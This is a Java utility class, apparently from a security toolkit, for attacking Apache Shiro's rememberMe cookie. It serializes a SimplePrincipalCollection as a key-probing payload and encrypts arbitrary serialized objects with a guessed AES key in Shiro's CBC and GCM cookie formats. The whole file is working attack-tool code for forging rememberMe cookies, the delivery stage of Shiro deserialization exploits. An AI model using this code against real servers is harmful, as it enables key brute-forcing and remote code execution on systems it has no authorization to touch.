package com.xyuxu.javasec.utils;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.security.SecureRandom;
import java.util.Base64;
import org.apache.shiro.subject.SimplePrincipalCollection; // 如果不想引入shiro依赖，需要自己模拟序列化数据，这里假设你有shiro-core或者直接构造字节数组

public class ShiroCryptoUtil {

    private static final int IV_SIZE = 16;
    private static final int GCM_TAG_LENGTH = 128;

    /**
     * 生成用于探测 Key 的简单序列化 payload (对应 SummerSec 的 KeyEcho.getObject/principal)
     * 这里使用 SimplePrincipalCollection，这是 Shiro 验证 Cookie 时一定会反序列化的类
     */
    public static byte[] getCheckPayload() {
        try {
            SimplePrincipalCollection simple = new SimplePrincipalCollection();
            ByteArrayOutputStream barr = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(barr);
            oos.writeObject(simple);
            oos.close();
            return barr.toByteArray();
        } catch (Exception e) {
            return new byte[0];
        }
    }

    /**
     * Shiro CBC 模式加密 (AES-CBC-PKCS5Padding)
     * 结构: IV + EncryptedData
     */
    public static String encryptCBC(String keyBase64, byte[] objectBytes) throws Exception {
        byte[] key = Base64.getDecoder().decode(keyBase64);
        byte[] iv = new byte[IV_SIZE];
        new SecureRandom().nextBytes(iv);

        SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
        IvParameterSpec ivSpec = new IvParameterSpec(iv);

        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);

        byte[] encrypted = cipher.doFinal(objectBytes);

        // 拼接 IV + CipherText
        byte[] output = new byte[iv.length + encrypted.length];
        System.arraycopy(iv, 0, output, 0, iv.length);
        System.arraycopy(encrypted, 0, output, iv.length, encrypted.length);

        return Base64.getEncoder().encodeToString(output);
    }

    /**
     * Shiro GCM 模式加密 (AES-GCM-NoPadding)
     * 结构: IV + EncryptedData + Tag (Tag通常由Cipher自动处理在末尾)
     */
    public static String encryptGCM(String keyBase64, byte[] objectBytes) throws Exception {
        byte[] key = Base64.getDecoder().decode(keyBase64);
        byte[] iv = new byte[IV_SIZE];
        new SecureRandom().nextBytes(iv);

        SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
        GCMParameterSpec ivSpec = new GCMParameterSpec(GCM_TAG_LENGTH, iv);

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);

        byte[] encrypted = cipher.doFinal(objectBytes);

        // 拼接 IV + CipherText
        byte[] output = new byte[iv.length + encrypted.length];
        System.arraycopy(iv, 0, output, 0, iv.length);
        System.arraycopy(encrypted, 0, output, iv.length, encrypted.length);

        return Base64.getEncoder().encodeToString(output);
    }
}